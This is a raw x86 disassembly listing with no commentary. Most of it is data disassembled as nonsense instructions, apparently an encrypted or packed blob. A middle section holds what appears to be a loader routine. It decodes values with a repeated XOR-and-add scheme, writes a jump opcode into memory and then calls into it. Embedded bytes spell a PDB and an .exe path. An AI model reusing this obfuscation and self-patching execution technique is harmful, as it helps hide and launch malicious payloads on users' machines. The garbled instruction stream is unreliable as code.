  42f8be:	loop   0x42f8bb
  42f8c0:	(bad)  
  42f8c1:	(bad)  
  42f8c3:	fidivr DWORD PTR [edx-0x361c060c]
  42f8c9:	retf   
  42f8ca:	or     eax,0xcad9e203
  42f8cf:	retf   
  42f8d0:	jmp    0x42f8b2
  42f8d2:	int    0xe8
  42f8d4:	enter  0xb5da,0xed
  42f8d8:	in     al,dx
  42f8d9:	jmp    esp
  42f8db:	out    dx,al
  42f8dc:	sar    bh,cl
  42f8de:	repnz clc 
  42f8e0:	mov    dh,0xfd
  42f8e2:	into   
  42f8e3:	ret    0xc003
  42f8e6:	out    0xc0,eax
  42f8e8:	fstp   st(6)
  42f8ea:	into   
  42f8eb:	or     eax,0xcbf9e407
  42f8f0:	jecxz  0x42f8ce
  42f8f2:	out    dx,eax
  42f8f3:	(bad)  
  42f8f4:	scas   al,BYTE PTR es:[edi]
  42f8f5:	lods   eax,DWORD PTR ds:[esi]
  42f8f6:	mov    ebx,0xf6eec9e6
  42f8fb:	sar    ch,1
  42f8fd:	enter  0xf1ba,0xf5
  42f901:	cli    
  42f902:	lock out 0xfc,al
  42f905:	(bad)  
  42f907:	add    al,0xe7
  42f909:	(bad)  
  42f90b:	ret    
  42f90c:	push   cs
  42f90d:	std    
  42f90e:	jmp    0xedab:0xbeedcbcd
  42f915:	imul   al
  42f917:	enter  0xedb8,0xf2
  42f91b:	cmc    
  42f91c:	fstp   TBYTE PTR [esi-0x25413108]
  42f922:	mov    BYTE PTR [esi],0xf9
  42f925:	add    ah,bl
  42f927:	aad    0xdc
  42f929:	or     dl,bl
  42f92b:	or     eax,0xedebdce4
  42f930:	stos   BYTE PTR es:[edi],al
  42f931:	mov    cl,0xbd
  42f933:	iret   
  42f934:	scas   al,BYTE PTR es:[edi]
  42f935:	in     al,0xf4
  42f937:	mov    cl,0xb9
  42f939:	jmp    0x42f934
  42f93b:	int3   
  42f93c:	repnz int 0xc8
  42f93f:	loopne 0x42f923
  42f941:	rol    BYTE PTR [edx],1
  42f943:	push   eax
  42f945:	or     al,BYTE PTR [edi+eax*1]
  42f948:	(bad)
  42f94b:	cld    
  42f94c:	or     al,cl
  42f94e:	enter  0xe5df,0xd7
  42f952:	repnz lock jecxz 0x42f911
  42f956:	rcl    dh,0xe4
  42f959:	aam    0xf2
  42f95b:	fucomp st(7)
  42f95d:	repnz iret 
  42f95f:	mov    ebp,0xf1fcfec3
  42f964:	(bad)
  42f968:	(bad)  
  42f969:	(bad)  
  42f96b:	cmc    
  42f96c:	std    
  42f96d:	fsub   st,st(0)
  42f96f:	jecxz  0x42f963
  42f971:	(bad)  
  42f973:	out    0xb3,al
  42f975:	jecxz  0x42f957
  42f977:	aad    0xc8
  42f979:	jmp    0xdffef558
  42f97e:	rol    bl,cl
  42f980:	ret    0xf6bf
  42f983:	(bad)  
  42f984:	shr    bl,1
  42f986:	rol    BYTE PTR [edx],cl
  42f988:	fidivr WORD PTR [ebp+0xfcaf9ce]
  42f98e:	jmp    0xb005e460
  42f993:	int3   
  42f994:	retf   
  42f995:	mov    dl,0xf5
  42f997:	iret   
  42f998:	mov    dh,0xca
  42f99a:	into   
  42f99b:	aad    0xbb
  42f99d:	rcl    ah,1
  42f99f:	out    dx,eax
  42f9a0:	idiv   esi
  42f9a2:	loopne 0x42f976
  42f9a4:	repnz fmul DWORD PTR [edx]
  42f9a7:	ror    ebx,0xef
  42f9aa:	fcmovbe st,st(4)
  42f9ac:	into   
  42f9ad:	call   0xf404c1ba
  42f9b2:	int3   
  42f9b3:	les    esi,FWORD PTR [esi-0x490d2b16]
  42f9b9:	(bad)  
  42f9ba:	cli    
  42f9bb:	repnz sar DWORD PTR [esi+ecx*8-0x1d082646],cl
  42f9c3:	repz in al,dx
  42f9c5:	repz xlat BYTE PTR ds:[ebx]
  42f9c7:	add    dh,ah
  42f9c9:	retf   0xd8ee
  42f9cc:	psubq  mm1,mm1
  42f9cf:	icebp  
  42f9d0:	neg    ebp
  42f9d2:	lock repz mov al,0xb1
  42f9d6:	mov    ebx,0xffd3b7b3
  42f9db:	clc    
  42f9dc:	(bad)  
  42f9de:	repnz int3 
  42f9e0:	mov    eax,0xddd207fb
  42f9e5:	sar    eax,1
  42f9e7:	fdivr  st(6),st
  42f9e9:	cmc    
  42f9ea:	call   0xda2fbcc7
  42f9ef:	icebp  
  42f9f0:	fcomp  st(6)
  42f9f2:	mov    ebp,0xf9c2aec2
  42f9f7:	into   
  42f9f8:	call   0xd03fecca
  42f9fd:	rol    DWORD PTR [ebx],cl
  42f9ff:	add    DWORD PTR [ecx-0x5010909],edi
  42fa05:	shl    bl,0x7
  42fa08:	loop   0x42f9ee
  42fa0a:	enter  0xda07,0xc9
  42fa0e:	in     al,0xf3
  42fa10:	lock out 0xc5,al
  42fa13:	lods   eax,DWORD PTR ds:[esi]
  42fa14:	xlat   BYTE PTR ds:[ebx]
  42fa15:	int    0xd5
  42fa17:	(bad)  
  42fa18:	int    0xf6
  42fa1a:	mov    ecx,0xdfdfb2be
  42fa1f:	imul   ebp
  42fa21:	mov    ch,0xb8
  42fa23:	mov    esi,0xf6ebe2f9
  42fa28:	or     eax,DWORD PTR [ebx]
  42fa2a:	aam    0xde
  42fa2c:	or     al,BYTE PTR [esi]
  42fa2e:	add    al,bl
  42fa30:	mov    al,0xd3
  42fa32:	mov    dl,0xd5
  42fa34:	jmp    0xb731af2a
  42fa39:	sti    
  42fa3a:	icebp  
  42fa3b:	(bad)  
  42fa3d:	retf   0xfabc
  42fa40:	out    dx,eax
  42fa41:	mov    ch,0xc1
  42fa43:	shl    esp,cl
  42fa45:	test   BYTE PTR [ecx],0xe3
  42fa48:	jmp    0xca38e41c
  42fa4d:	jmp    0xc729de5e
  42fa52:	repnz ror esi,cl
  42fa55:	sti    
  42fa56:	lods   al,BYTE PTR ds:[esi]
  42fa57:	repz sar dh,1
  42fa5a:	fprem1 
  42fa5c:	jmp    0xe12fbe5d
  42fa61:	add    cl,dl
  42fa63:	cli    
  42fa64:	jmp    0x42fa5f
  42fa66:	or     eax,DWORD PTR [ecx]
  42fa68:	shl    bl,1
  42fa6a:	test   BYTE PTR [ecx],0x5
  42fa6d:	or     ch,cl
  42fa6f:	mov    ebp,0xcfdea5c3
  42fa74:	mov    bl,0xb5
  42fa76:	out    dx,eax
  42fa77:	sar    bl,1
  42fa79:	in     eax,0xdd
  42fa7b:	fdiv   QWORD PTR [ebp-0x12321224]
  42fa81:	in     eax,dx
  42fa82:	loope  0x42fa82
  42fa84:	mov    ebp,0xc9e900e2
  42fa89:	or     dl,dh
  42fa8b:	out    dx,eax
  42fa8c:	loop   0x42fa53
  42fa8e:	out    dx,al
  42fa8f:	out    dx,eax
  42fa90:	enter  0xc0eb,0xaf
  42fa94:	iret   
  42fa95:	mov    bl,0xe1
  42fa97:	enter  0xd5d7,0xda
  42fa9b:	fcmovne st,st(2)
  42fa9d:	ror    dl,1
  42fa9f:	hlt    
  42faa0:	enter  0xd6e3,0xc2
  42faa4:	add    eax,0xc2f9fa0a
  42faa9:	push   es
  42faaa:	add    ch,bl
  42faac:	loop   0x42fab8
  42faae:	in     eax,0xc0
  42fab0:	jmp    0xf72cbd9b
  42fab5:	jmp    0x42fa7c
  42fab7:	into   
  42fab8:	xlat   BYTE PTR ds:[ebx]
  42fab9:	fidiv  WORD PTR [ebp-0x37132b31]
  42fabf:	(bad)  
  42fac0:	repz iret 
  42fac2:	lock ret 
  42fac4:	jmp    0x42fac1
  42fac6:	in     al,0xc9
  42fac8:	pop    es
  42fac9:	les    eax,FWORD PTR [edi]
  42facb:	mov    BYTE PTR [ebx],0xfe
  42face:	out    0xab,al
  42fad0:	jmp    0x42fac0
  42fad2:	test   edx,0xc0e2c4f5
  42fad8:	out    0xff,eax
  42fada:	aam    0xb4
  42fadc:	fidivr WORD PTR [ecx-0x3100fe06]
  42fae2:	ret    0xe5fb
  42fae5:	ret    0xd90b
  42fae8:	loop   0x42fab0
  42faea:	leave  
  42faeb:	or     eax,esp
  42faed:	or     ecx,esi
  42faef:	repz call 0xc2efcde6
  42faf5:	ret    0xb2e7
  42faf8:	jmp    0xdfb5:0xe4e9b5fb
  42faff:	in     al,dx
  42fb00:	jecxz  0x42fac2
  42fb02:	add    bl,dl
  42fb04:	hlt    
  42fb05:	hlt    
  42fb06:	(bad)  
  42fb07:	or     ecx,eax
  42fb09:	faddp  st(0),st
  42fb0b:	jecxz  0x42fad3
  42fb0d:	or     al,0xd8
  42fb0f:	scas   al,BYTE PTR es:[edi]
  42fb10:	in     eax,0xe2
  42fb12:	scas   al,BYTE PTR es:[edi]
  42fb13:	iret   
  42fb14:	mov    cl,0xe6
  42fb16:	jmp    0xe638d401
  42fb1b:	shr    dh,1
  42fb1d:	fsub   st(7),st
  42fb1f:	rcl    edx,1
  42fb21:	fcompp 
  42fb23:	jecxz  0x42faea
  42fb25:	ret    0xc3bc
  42fb28:	hlt    
  42fb29:	(bad)  
  42fb2b:	out    0xf,al
  42fb2d:	add    DWORD PTR [ebx],edx
  42fb2f:	ror    al,1
  42fb31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb32:	scas   eax,DWORD PTR es:[edi]
  42fb33:	mov    dh,0xae
  42fb35:	retf   
  42fb36:	rol    ebp,1
  42fb38:	int    0xf5
  42fb3a:	int3   
  42fb3b:	mov    ebx,0xc8bdb8d9
  42fb40:	fdivrp st(6),st
  42fb42:	loopne 0x42fb40
  42fb44:	(bad)  
  42fb45:	in     al,0xf5
  42fb47:	(bad)  
  42fb48:	(bad)  
  42fb49:	loope  0x42fb31
  42fb4b:	std    
  42fb4c:	out    0xf9,al
  42fb4e:	pop    es
  42fb4f:	ffree  st(5)
  42fb51:	retf   0xddc7
  42fb54:	xlat   BYTE PTR ds:[ebx]
  42fb55:	shl    BYTE PTR [ebp-0x163b4917],cl
  42fb5b:	jmp    0x3f7c53b
  42fb60:	mov    edx,0xc3d1dce1
  42fb65:	retf   
  42fb66:	mov    ch,0xff
  42fb69:	add    al,0xfe
  42fb6b:	out    dx,eax
  42fb6c:	out    0x13,eax
  42fb6e:	shl    BYTE PTR [edi-0x38302c40],0xf3
  42fb75:	mov    dh,0xc0
  42fb77:	jmp    0xd618d649
  42fb7c:	(bad)  
  42fb7d:	jmp    0x42fb75
  42fb7f:	lock iret 
  42fb81:	fcmovnu st,st(0)
  42fb83:	rol    cl,1
  42fb85:	mov    ebp,0xfbdd04fa
  42fb8a:	aad    0xea
  42fb8c:	or     eax,0xf3ed0604
  42fb91:	out    0xcd,al
  42fb93:	ret    
  42fb94:	in     al,0xc4
  42fb96:	shl    ch,0xdb
  42fb99:	out    0xeb,al
  42fb9b:	int    0xdf
  42fb9d:	mov    edx,0xbff6e8f8
  42fba2:	mov    ah,0x2
  42fba4:	ffree  st(7)
  42fba6:	mov    eax,0xe1d406bf
  42fbab:	retf   0xeaf8
  42fbae:	add    BYTE PTR [esi-0x4c0d2e15],bh
  42fbb4:	retf   0xeec5
  42fbb7:	mov    ecx,DWORD PTR [ebp-0x34]
  42fbba:	mov    DWORD PTR [ecx],eax
  42fbbc:	lea    eax,[ebp-0x20]
  42fbbf:	mov    DWORD PTR [ebp-0x1c],eax
  42fbc2:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbc5:	mov    eax,DWORD PTR [eax]
  42fbc7:	mov    ecx,DWORD PTR [ebp-0x20]
  42fbca:	sub    eax,ecx
  42fbcc:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbcf:	mov    DWORD PTR [ecx],eax
  42fbd1:	mov    eax,DWORD PTR [ebp-0x38]
  42fbd4:	xor    eax,0x75108b5
  42fbd9:	add    eax,0x3272fb
  42fbde:	mov    ecx,DWORD PTR [ebp-0x1c]
  42fbe1:	mov    ecx,DWORD PTR [ecx]
  42fbe3:	or     ecx,eax
  42fbe5:	mov    eax,DWORD PTR [ebp-0x1c]
  42fbe8:	mov    DWORD PTR [eax],ecx
  42fbea:	lea    eax,[ebp-0x30]
  42fbed:	mov    DWORD PTR [ebp-0x94],eax
  42fbf3:	mov    eax,DWORD PTR [ebp-0x94]
  42fbf9:	mov    eax,DWORD PTR [eax]
  42fbfb:	mov    ecx,DWORD PTR [ebp-0x30]
  42fbfe:	sub    eax,ecx
  42fc00:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc06:	mov    DWORD PTR [ecx],eax
  42fc08:	mov    eax,DWORD PTR [ebp-0x94]
  42fc0e:	mov    eax,DWORD PTR [eax]
  42fc10:	or     eax,0xf89c85bf
  42fc15:	mov    ecx,DWORD PTR [ebp-0x94]
  42fc1b:	mov    DWORD PTR [ecx],eax
  42fc1d:	mov    eax,DWORD PTR [ebp-0x10]
  42fc20:	xor    eax,0x75108b5
  42fc25:	add    eax,0x3272fb
  42fc2a:	push   eax
  42fc2b:	mov    eax,DWORD PTR [ebp-0x4]
  42fc2e:	xor    eax,0x75108b5
  42fc33:	add    eax,0x3272fb
  42fc38:	push   eax
  42fc39:	mov    eax,DWORD PTR [ebp-0x30]
  42fc3c:	xor    eax,0x75108b5
  42fc41:	add    eax,0x3272ff
  42fc46:	push   eax
  42fc47:	lea    eax,[ebp-0x88]
  42fc4d:	push   eax
  42fc4e:	push   DWORD PTR [ebp-0x38]
  42fc51:	push   DWORD PTR [ebp-0x90]
  42fc57:	call   0x415490
  42fc5c:	test   eax,eax
  42fc5e:	je     0x42fc98
  42fc64:	lea    eax,[ebp-0x88]
  42fc6a:	push   eax
  42fc6b:	mov    eax,DWORD PTR [ebp-0x90]
  42fc71:	xor    eax,0x75108b5
  42fc76:	add    eax,0x3272fb
  42fc7b:	push   eax
  42fc7c:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc7f:	add    eax,0xaa
  42fc84:	push   eax
  42fc85:	mov    eax,DWORD PTR [ebp-0x2c]
  42fc88:	mov    eax,DWORD PTR [eax+0x198]
  42fc8e:	push   DWORD PTR [eax]
  42fc90:	call   0x40d347
  42fc95:	mov    DWORD PTR [ebp-0xc],eax
  42fc98:	lea    eax,[ebp+0x4]
  42fc9b:	mov    ecx,DWORD PTR ds:0x437497
  42fca1:	mov    DWORD PTR [ecx*4+0x43748f],eax
  42fca8:	mov    eax,ds:0x437497
  42fcad:	inc    eax
  42fcae:	mov    ds:0x437497,eax
  42fcb3:	mov    eax,DWORD PTR [ebp-0xc]
  42fcb6:	sub    eax,0x3272fb
  42fcbb:	xor    eax,0x75108b5
  42fcc0:	cmp    eax,0xf89c85b0
  42fcc5:	jne    0x42fcd5
  42fccb:	jmp    0x42fd86
  42fcd0:	jmp    0x42fd86
  42fcd5:	lea    eax,[ebp-0x9c]
  42fcdb:	mov    DWORD PTR [ebp-0x98],eax
  42fce1:	lea    eax,[ebp-0x98]
  42fce7:	mov    DWORD PTR [ebp-0xa0],eax
  42fced:	mov    eax,DWORD PTR [ebp-0x3c]
  42fcf0:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fcf6:	mov    ecx,DWORD PTR [ecx]
  42fcf8:	mov    DWORD PTR [ecx],eax
  42fcfa:	mov    eax,DWORD PTR [ebp-0xc]
  42fcfd:	mov    ecx,DWORD PTR [ebp-0x98]
  42fd03:	mov    ecx,DWORD PTR [ecx]
  42fd05:	sub    ecx,eax
  42fd07:	mov    eax,DWORD PTR [ebp-0x98]
  42fd0d:	mov    DWORD PTR [eax],ecx
  42fd0f:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd15:	mov    eax,DWORD PTR [eax]
  42fd17:	mov    ecx,DWORD PTR [ebp-0x30]
  42fd1a:	xor    ecx,0x75108b5
  42fd20:	add    ecx,0x3272fb
  42fd26:	mov    eax,DWORD PTR [eax]
  42fd28:	sub    eax,ecx
  42fd2a:	mov    ecx,DWORD PTR [ebp-0xa0]
  42fd30:	mov    ecx,DWORD PTR [ecx]
  42fd32:	mov    DWORD PTR [ecx],eax
  42fd34:	mov    eax,DWORD PTR [ebp-0xc]
  42fd37:	mov    DWORD PTR [eax],0x657664e9
  42fd3d:	mov    DWORD PTR [eax+0x4],0x86787677
  42fd44:	mov    eax,DWORD PTR [ebp-0xa0]
  42fd4a:	mov    eax,DWORD PTR [eax]
  42fd4c:	mov    eax,DWORD PTR [eax]
  42fd4e:	mov    ecx,DWORD PTR [ebp-0xc]
  42fd51:	mov    DWORD PTR [ecx+0x1],eax
  42fd54:	push   DWORD PTR [ebp-0x2c]
  42fd57:	mov    eax,ds:0x437463
  42fd5c:	mov    eax,DWORD PTR [eax]
  42fd5e:	push   DWORD PTR [eax]
  42fd60:	push   DWORD PTR ds:0x43747f
  42fd66:	push   DWORD PTR ds:0x437223
  42fd6c:	push   DWORD PTR ds:0x43745f
  42fd72:	push   DWORD PTR ds:0x437503
  42fd78:	push   DWORD PTR [ebp-0x90]
  42fd7e:	push   DWORD PTR [ebp-0x38]
  42fd81:	mov    eax,DWORD PTR [ebp-0xc]
  42fd84:	call   eax
  42fd86:	leave  
  42fd87:	ret    0x10
	...
  42fd92:	add    BYTE PTR [eax],al
  42fd94:	pop    ds
  42fd95:	or     al,0xaa
  42fd97:	dec    ebp
  42fd98:	add    BYTE PTR [eax],al
  42fd9a:	add    BYTE PTR [eax],al
  42fd9c:	add    al,BYTE PTR [eax]
  42fd9e:	add    BYTE PTR [eax],al
  42fda0:	add    BYTE PTR ss:[eax],al
  42fda3:	add    BYTE PTR [eax-0x4ffffd03],dh
  42fda9:	icebp  
  42fdaa:	add    al,BYTE PTR [eax]
  42fdac:	add    BYTE PTR [eax],al
  42fdae:	add    BYTE PTR [eax],al
  42fdb0:	push   edx
  42fdb1:	push   ebx
  42fdb2:	inc    esp
  42fdb3:	push   ebx
  42fdb4:	icebp  
  42fdb5:	je     0x42fdf4
  42fdb7:	jnp    0x42fe0c
  42fdb9:	shl    DWORD PTR [ebx-0x7b8e7dbc],0x5b
  42fdc0:	xchg   ecx,eax
  42fdc1:	dec    ebx
  42fdc2:	js     0x42fdee
  42fdc4:	add    DWORD PTR [eax],eax
  42fdc6:	add    BYTE PTR [eax],al
  42fdc8:	inc    ebx
  42fdc9:	cmp    bl,BYTE PTR [eax+ecx*2+0x65]
  42fdcd:	ins    BYTE PTR es:[edi],dx
  42fdce:	ins    BYTE PTR es:[edi],dx
  42fdcf:	outs   dx,DWORD PTR ds:[esi]
  42fdd0:	pop    esp
  42fdd1:	dec    ecx
  42fdd2:	outs   dx,BYTE PTR ds:[esi]
  42fdd3:	jae    0x42fe3a
  42fdd5:	jb     0x42fe4b
  42fdd7:	pop    esp
  42fdd8:	inc    esp
  42fdd9:	popa   
  42fdda:	je     0x42fe3d
  42fddc:	pop    esp
  42fddd:	inc    esi
  42fdde:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2e],0x657865
	...
  42fdf2:	add    BYTE PTR [eax],al
  42fdf4:	pop    ds
  42fdf5:	or     al,0xaa
  42fdf7:	dec    ebp
  42fdf8:	add    BYTE PTR [eax],al
  42fdfa:	add    BYTE PTR [eax],al
  42fdfc:	and    bh,dh
  42fdfe:	add    al,BYTE PTR [eax]
  42fe00:	add    DWORD PTR [eax],eax
  42fe02:	add    BYTE PTR [eax],al
  42fe04:	add    DWORD PTR [eax],eax
  42fe06:	add    BYTE PTR [eax],al
  42fe08:	add    DWORD PTR [eax],eax
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	sbb    dh,bh
  42fe0e:	add    al,BYTE PTR [eax]
  42fe10:	sbb    al,0xfe
  42fe12:	add    al,BYTE PTR [eax]
  42fe14:	and    dh,bh
  42fe16:	add    al,BYTE PTR [eax]
  42fe18:	mov    ds:0x3200001a,eax
  42fe1d:	inc    BYTE PTR [edx]
  42fe1f:	add    BYTE PTR [eax],al
  42fe21:	add    BYTE PTR [ebx+0x65],dl
  42fe24:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  42fe28:	outs   dx,BYTE PTR ds:[esi]
  42fe29:	inc    esp
  42fe2a:	popa   
  42fe2b:	je     0x42fe8e
  42fe2d:	pop    edi
  42fe2e:	inc    ebp
  42fe2f:	js     0x42fea1
  42fe31:	add    BYTE PTR [edi+0x49],bl
  42fe34:	jae    0x42fe8d
  42fe36:	outs   dx,DWORD PTR ds:[esi]
  42fe37:	ja     0x42fe6f
  42fe39:	xor    al,0x4d
  42fe3b:	gs jae 0x42feb1
  42fe3e:	popa   
  42fe3f:	addr16 gs dec ecx
  42fe42:	jae    0x42fe9b
  42fe44:	outs   dx,DWORD PTR ds:[esi]
  42fe45:	ja     0x42fe7d
  42fe47:	xor    al,0x4d
  42fe49:	gs jae 0x42febf
  42fe4c:	popa   
  42fe4d:	addr16 gs inc eax
  42fe50:	xor    BYTE PTR [eax],al
  42fe52:	or     eax,0xc9c964a5
  42fe57:	adc    esi,DWORD PTR [ebp+0x55]
  42fe5a:	pop    ss
  42fe5b:	jne    0x42fec6
  42fe5d:	or     eax,0x61216975
  42fe62:	icebp  
  42fe63:	xchg   edi,eax
  42fe64:	or     eax,0x55ead669
  42fe69:	icebp  
  42fe6a:	xchg   edi,eax
  42fe6b:	or     eax,0xd6bb269
  42fe70:	jne    0x42fe04
  42fe72:	jmp    DWORD PTR [edx+0x750dfa91]
  42fe78:	xchg   bh,bh
  42fe7a:	mov    ds:0x750dfd3a,al
  42fe7f:	xchg   edx,eax
  42fe80:	jmp    DWORD PTR [edx+0x750df33b]
  42fe86:	xchg   edx,eax
  42fe87:	jmp    DWORD PTR [edx+0x22574956]
  42fe8d:	xchg   BYTE PTR [ecx-0x5b],ah
  42fe90:	or     eax,0xd264d664
  42fe95:	pop    edi
  42fe96:	popa   
  42fe97:	popa   
  42fe98:	(bad)  
  42fe99:	jmp    0xb269:0x1e2ad9a
  42fea0:	xchg   ecx,eax
  42fea1:	(bad)  
  42fea2:	jmp    0xe769:0x1e22586
  42fea9:	xor    al,0xf0
  42feab:	mov    cl,0x8d
  42fead:	popa   
  42feae:	popa   
  42feaf:	or     eax,0xe2178e75
  42feb4:	out    0x62,eax
  42feb6:	bound  esp,QWORD PTR [edx+0x14]
  42feb9:	(bad)  
  42febb:	popa   
  42febc:	popa   
  42febd:	xchg   esp,eax
  42febe:	pop    ss
  42febf:	loop   0x42fe5b
  42fec1:	bound  esp,QWORD PTR [edx+0x62]
  42fec4:	adc    al,0x34
  42fec6:	int3   
  42fec7:	popa   
  42fec8:	popa   
  42fec9:	xchg   esp,eax
  42feca:	pop    ss
  42fecb:	loop   0x42fe5d
  42fecd:	bound  esp,QWORD PTR [edx+0x62]
  42fed0:	adc    al,0xdd
  42fed2:	int3   
  42fed3:	popa   
  42fed4:	popa   
  42fed5:	xchg   esp,eax
  42fed6:	pop    ss
  42fed7:	loop   0x42fe5f
  42fed9:	bound  esp,QWORD PTR [edx+0x62]
  42fedc:	adc    al,0xaa
  42fede:	int3   
  42fedf:	popa   
  42fee0:	popa   
  42fee1:	xchg   esp,eax
  42fee2:	pop    ss
  42fee3:	loop   0x42fe71
  42fee5:	bound  esp,QWORD PTR [edx+0x62]
  42fee8:	adc    al,0x7a
  42feea:	int3   
  42feeb:	popa   
  42feec:	popa   
  42feed:	xchg   esp,eax
  42feee:	pop    ss
  42feef:	loop   0x42fe83
  42fef1:	bound  esp,QWORD PTR [edx+0x62]
  42fef4:	adc    al,0xab
  42fef6:	int3   
  42fef7:	popa   
  42fef8:	popa   
  42fef9:	xchg   esp,eax
  42fefa:	pop    ss
  42fefb:	loop   0x42fe85
  42fefd:	bound  esp,QWORD PTR [edx+0x62]
  42ff00:	adc    al,0x17
  42ff02:	shl    DWORD PTR [ecx+0x61],cl
  42ff05:	xchg   esp,eax
  42ff06:	pop    ss
  42ff07:	loop   0x42ff87
  42ff09:	bound  esp,QWORD PTR [edx+0x62]
  42ff0c:	adc    al,0x9e
  42ff0e:	int3   
  42ff0f:	popa   
  42ff10:	popa   
  42ff11:	xchg   esp,eax
  42ff12:	pop    ss
  42ff13:	loop   0x42ff7f
  42ff15:	bound  esp,QWORD PTR [edx+0x62]
  42ff18:	adc    al,0xd
  42ff1a:	shl    DWORD PTR [ecx+0x61],cl
  42ff1d:	xchg   esp,eax
  42ff1e:	pop    ss
  42ff1f:	loop   0x42feab
  42ff21:	bound  esp,QWORD PTR [edx+0x62]
  42ff24:	adc    al,0x85
  42ff26:	int3   
  42ff27:	popa   
  42ff28:	popa   
  42ff29:	xchg   esp,eax
  42ff2a:	pop    ss
  42ff2b:	loop   0x42fead
  42ff2d:	bound  esp,QWORD PTR [edx+0x62]
  42ff30:	adc    al,0x34
  42ff32:	int3   
  42ff33:	popa   
  42ff34:	popa   
  42ff35:	xchg   esp,eax
  42ff36:	pop    ss
  42ff37:	loop   0x42ffaf
  42ff39:	bound  esp,QWORD PTR [edx+0x62]
  42ff3c:	adc    al,0x32
  42ff3e:	int3   
  42ff3f:	popa   
  42ff40:	popa   
  42ff41:	xchg   esp,eax
  42ff42:	pop    ss
  42ff43:	loop   0x42ffc1
  42ff45:	bound  esp,QWORD PTR [edx+0x62]
  42ff48:	adc    al,0xd1
  42ff4a:	jno    0x42ffad
  42ff4c:	popa   
  42ff4d:	xchg   esp,eax
  42ff4e:	pop    ss
  42ff4f:	loop   0x42ff4c
  42ff51:	bound  esp,QWORD PTR [edx+0x62]
  42ff54:	adc    al,0xb1
  42ff56:	and    BYTE PTR [ecx+0x61],0x94
  42ff5a:	pop    ss
  42ff5b:	loop   0x42ffd5
  42ff5d:	bound  esp,QWORD PTR [edx+0x62]
  42ff60:	adc    al,0xac
  42ff62:	cmp    esp,DWORD PTR [ecx+0x61]
  42ff65:	xchg   esp,eax
  42ff66:	pop    ss
  42ff67:	loop   0x42fef7
  42ff69:	bound  esp,QWORD PTR [edx+0x62]
  42ff6c:	adc    al,0x77
  42ff6e:	fbld   TBYTE PTR [ecx+0x61]
  42ff71:	xchg   esp,eax
  42ff72:	pop    ss
  42ff73:	loop   0x42ff49
  42ff75:	bound  esp,QWORD PTR [edx+0x62]
  42ff78:	adc    al,0xa3
  42ff7a:	int3   
  42ff7b:	popa   
  42ff7c:	popa   
  42ff7d:	xchg   esp,eax
  42ff7e:	pop    ss
  42ff7f:	loop   0x42ffb9
  42ff81:	bound  esp,QWORD PTR [edx+0x62]
  42ff84:	adc    al,0xe6
  42ff86:	int3   
  42ff87:	popa   
  42ff88:	popa   
  42ff89:	xchg   esp,eax
  42ff8a:	pop    ss
  42ff8b:	loop   0x42ff5f
  42ff8d:	bound  esp,QWORD PTR [edx+0x62]
  42ff90:	adc    al,0x34
  42ff92:	int3   
  42ff93:	popa   
  42ff94:	popa   
  42ff95:	xchg   esp,eax
  42ff96:	pop    ss
  42ff97:	loop   0x42ff61
  42ff99:	bound  esp,QWORD PTR [edx+0x62]
  42ff9c:	adc    al,0xe3
  42ff9e:	int3   
  42ff9f:	popa   
  42ffa0:	popa   
  42ffa1:	xchg   esp,eax
  42ffa2:	pop    ss
  42ffa3:	loop   0x42ff63
  42ffa5:	bound  esp,QWORD PTR [edx+0x62]
  42ffa8:	adc    al,0xa1
  42ffaa:	int3   
  42ffab:	popa   
  42ffac:	popa   
  42ffad:	xchg   esp,eax
  42ffae:	pop    ss
  42ffaf:	loop   0x42ff55
  42ffb1:	bound  esp,QWORD PTR [edx+0x62]
  42ffb4:	adc    al,0xe5
  42ffb6:	int3   
  42ffb7:	popa   
  42ffb8:	popa   
  42ffb9:	xchg   esp,eax
  42ffba:	pop    ss
  42ffbb:	loop   0x42ff87
  42ffbd:	bound  esp,QWORD PTR [edx+0x62]
  42ffc0:	adc    al,0x9d
  42ffc2:	int3   
  42ffc3:	popa   
  42ffc4:	popa   
  42ffc5:	xchg   esp,eax
  42ffc6:	pop    ss
  42ffc7:	loop   0x42ff89
  42ffc9:	bound  esp,QWORD PTR [edx+0x62]
  42ffcc:	adc    al,0xc5
  42ffce:	int3   
  42ffcf:	popa   
  42ffd0:	popa   
  42ffd1:	xchg   esp,eax
  42ffd2:	pop    ss
  42ffd3:	loop   0x42ff8b
  42ffd5:	bound  esp,QWORD PTR [edx+0x62]
  42ffd8:	adc    al,0xaf
  42ffda:	int3   
  42ffdb:	popa   
  42ffdc:	popa   
  42ffdd:	xchg   esp,eax
  42ffde:	pop    ss
  42ffdf:	loop   0x42ff9d
  42ffe1:	bound  esp,QWORD PTR [edx+0x62]
  42ffe4:	adc    al,0xe0
  42ffe6:	int3   
  42ffe7:	popa   
  42ffe8:	popa   
  42ffe9:	xchg   esp,eax
  42ffea:	pop    ss
  42ffeb:	loop   0x43002d
  42ffed:	bound  esp,QWORD PTR [edx+0x62]
  42fff0:	adc    al,0x9e
  42fff2:	int3   
  42fff3:	popa   
  42fff4:	popa   
  42fff5:	xchg   esp,eax
  42fff6:	pop    ss
  42fff7:	loop   0x42ffb1
  42fff9:	bound  esp,QWORD PTR [edx+0x62]
  42fffc:	adc    al,0x34
  42fffe:	int3   
  42ffff:	popa   
  430000:	popa   
  430001:	xchg   esp,eax
  430002:	pop    ss
  430003:	loop   0x42ffd3
  430005:	bound  esp,QWORD PTR [edx+0x62]
  430008:	adc    al,0x38
  43000a:	int3   
  43000b:	popa   
  43000c:	popa   
  43000d:	xchg   esp,eax
  43000e:	pop    ss
  43000f:	loop   0x42ffa5
  430011:	bound  esp,QWORD PTR [edx+0x62]
  430014:	adc    al,0xcc
  430016:	inc    ebp
  430017:	popa   
  430018:	popa   
  430019:	xchg   esp,eax
  43001a:	pop    ss
  43001b:	loop   0x430097
  43001d:	bound  esp,QWORD PTR [edx+0x62]
  430020:	adc    al,0xd3
  430022:	es popa 
  430024:	popa   
  430025:	xchg   esp,eax
  430026:	pop    ss
  430027:	loop   0x430099
  430029:	bound  esp,QWORD PTR [edx+0x62]
  43002c:	adc    al,0xdc
  43002e:	dec    eax
